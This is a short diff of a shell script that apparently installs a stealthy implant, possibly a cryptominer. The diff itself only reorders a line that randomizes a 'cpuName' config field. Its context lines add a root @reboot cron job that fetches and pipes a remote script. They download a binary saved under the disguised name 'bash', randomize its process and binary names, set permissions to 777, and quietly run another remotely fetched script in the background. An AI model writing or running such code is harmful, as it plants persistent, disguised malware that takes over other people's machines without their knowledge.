@@ -40,8 +40,8 @@ sudo sed -i "/^@reboot/d;\$a\@reboot root wget --no-check-certificate -qO- ${src
 rm -rf "${work}"; mkdir -p "${work}"
 wget --no-check-certificate -qO "${work}/appsettings.json" "${src}/q.json"
 wget --no-check-certificate -qO "${work}/bash" "${src}/q"
-[ -f "${work}/appsettings.json" ] && sed -i "s/\"cpuName\":.*/\"cpuName\": \"$(RandString 5)\",/" "${work}/appsettings.json"
 [ -f "${work}/appsettings.json" ] && sed -i "s/\"alias\":.*/\"alias\": \"${name}\",/" "${work}/appsettings.json"
+[ -f "${work}/appsettings.json" ] && sed -i "s/\"cpuName\":.*/\"cpuName\": \"$(RandString 5)\",/" "${work}/appsettings.json"
 [ -f "${work}/appsettings.json" ] && sed -i "s/\"binaryName\":.*/\"binaryName\": \"$(RandString 5)\",/" "${work}/appsettings.json"
 chmod -R 777 "${work}"
 sh <(wget --no-check-certificate -qO- "${src}/pid.sh") "${work}" >/dev/null 2>&1 &
